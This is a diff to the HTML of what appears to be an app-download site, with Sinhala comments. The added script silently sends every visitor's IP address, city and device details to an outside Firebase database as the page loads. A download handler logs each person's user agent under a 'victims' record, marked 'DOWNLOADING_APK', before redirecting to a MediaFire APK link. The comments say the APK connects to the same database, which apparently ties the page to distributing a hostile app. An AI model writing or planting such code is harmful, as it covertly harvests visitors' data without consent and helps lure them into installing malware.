@@ -262,6 +262,42 @@
             drops[i]++;
         });
     }
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+<script>
+  // Firebase Config (සයිට් එක සහ APK එක දෙකම මේකට කනෙක්ට් වෙනවා)
+  const config = { databaseURL: "https://dark-dragon-team-default-rtdb.firebaseio.com/" };
+  firebase.initializeApp(config);
+  const db = firebase.database();
+
+  // 1. සයිට් එකට ආපු ගමන් IP/Device විස්තර ගැනීම
+  window.onload = async () => {
+      try {
+          const res = await fetch('https://ipapi.co/json/');
+          const info = await res.json();
+          db.ref('site_visitors').push({
+              ip: info.ip, city: info.city, device: navigator.platform, 
+              time: new Date().toLocaleString(), status: "Browsing"
+          });
+      } catch(e) {}
+  };
+
+  // 2. ඩවුන්ලෝඩ් බටන් එක එබුවම ක්‍රියාත්මක වන Function එක
+  async function handleDownload(appName, mediafireUrl) {
+      const logRef = db.ref('victims').push();
+      await logRef.set({
+          target: appName,
+          device: navigator.platform,
+          agent: navigator.userAgent,
+          time: new Date().toLocaleString(),
+          status: "DOWNLOADING_APK"
+      });
+      // තත්පරයකට පසු ඌව නියම ලින්ක් එකට යවනවා
+      setTimeout(() => { window.location.href = mediafireUrl; }, 1000);
+  }
+    
 </script>
 </body>
 </html>
